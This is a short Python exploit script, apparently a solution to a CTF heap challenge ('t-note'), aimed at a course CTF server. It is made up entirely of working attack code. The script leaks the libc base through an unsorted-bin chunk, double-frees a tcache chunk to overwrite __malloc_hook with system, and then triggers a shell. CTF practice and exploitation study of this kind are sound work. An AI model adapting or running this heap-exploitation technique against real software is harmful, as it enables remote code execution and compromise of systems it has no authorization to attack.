from pwn import *

local = False
elf = 't-note' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10179
    r = remote(ip,port)

context.arch = 'amd64'
l = ELF('./libc.so')

def add( size , note ):
	r.sendafter( '>' , '1' )
	r.sendafter( 'Size: ' , str(size) )
	r.sendafter( 'Note: ' , note )

def show( index ):
	r.sendafter( '>' , '2' )
	r.sendafter( 'Index: ' , str(index) )

def delete( index ):
	r.sendafter( '>' , '3' )
	r.sendafter( 'Index: ' , str(index) )

raw_input("aaa")

add( 0x410 , 'aaaaaaaa')
add( 0x20 , 'a')
delete( 0 )
show( 0 )

r.recvline()
l.address = u64( r.recv(6) + '\0\0' ) - 0x3ebca0
success("libc -> %s",hex(l.address))

delete( 1 )
delete( 1 )

add( 0x20 , p64( l.sym.__malloc_hook ) )
add( 0x20 , 'a' )
#add( 0x68 , p64( l.address + 0xf02a4 ) )
add( 0x20 , p64( l.sym.system ) )
r.sendafter( '>' , '1' )
r.sendafter( 'Size: ' , str(l.search('/bin/sh').next())  )
r.interactive()
